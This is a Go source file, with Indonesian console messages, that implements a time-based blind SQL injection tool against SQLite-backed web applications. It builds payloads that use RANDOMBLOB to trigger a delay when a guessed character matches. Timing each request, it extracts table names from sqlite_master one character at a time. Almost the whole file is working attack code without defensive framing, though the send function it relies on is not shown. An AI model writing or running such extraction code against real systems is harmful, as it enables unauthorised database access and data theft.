package inject

import (
	"fmt"
	"time"
)

const delayThreshold = 800 * time.Millisecond

func runTimeTest(baseURL string) {
	fmt.Println("\n=== STARTING TABLE EXTRACTION (TIME-BASED) ===")
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"

	for tableIdx := 0; ; tableIdx++ {
		extractedTableName := ""
		fmt.Printf("\n[*] Menarik nama tabel ke-%d...\n", tableIdx)

		for i := 1; i <= 32; i++ {
			foundChar := false

			for _, char := range charset {
				payload := fmt.Sprintf(
					"1 AND (SELECT CASE WHEN (substr((SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%%' LIMIT 1 OFFSET %d), %d, 1) = '%c') THEN (SELECT UPPER(HEX(RANDOMBLOB(50000000)))) ELSE 1 END)",
					tableIdx, i, char,
				)

				if checkCondition(baseURL, payload) {
					extractedTableName += string(char)
					fmt.Printf("[+] Posisi %d: %c\n", i, char)
					foundChar = true
					break
				}
			}

			if !foundChar {
				break
			}
		}

		if extractedTableName == "" {
			fmt.Println("\n[!] Semua nama tabel telah berhasil diekstrak.")
			break
		}

		fmt.Printf("[>>>] Tabel ditemukan: %s\n", extractedTableName)
	}
}

func checkCondition(baseURL string, payload string) bool {
	start := time.Now()
	send(baseURL, payload)
	duration := time.Since(start)

	// DEBUG: Hapus jika sudah lancar
	if duration > 20*time.Millisecond {
		if duration > delayThreshold {
			fmt.Printf(" [SUCCESS] Delay Detected: %v\n", duration)
			return true
		}
		fmt.Printf(" [DEBUG] Potential hit but below threshold: %v\n", duration)
	}

	return duration > delayThreshold
}
